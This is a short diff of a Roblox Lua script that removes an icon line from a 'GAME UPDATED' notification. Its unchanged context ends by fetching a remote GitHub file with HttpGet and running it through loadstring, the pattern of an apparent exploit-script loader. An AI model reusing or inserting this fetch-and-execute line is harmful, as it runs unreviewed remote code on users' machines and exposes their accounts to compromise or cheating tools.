@@ -3,7 +3,6 @@
 game:GetService("StarterGui"):SetCore("SendNotification",{
 	Title = " GAME UPDATED", -- Required
 	Text = "some functions may not work rn!", -- Required
-	Icon = "rbxassetid://1234567890" -- Optional
 })
 wait(4)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HEINHARDT/refinery_gui/main/check.lua",true))()
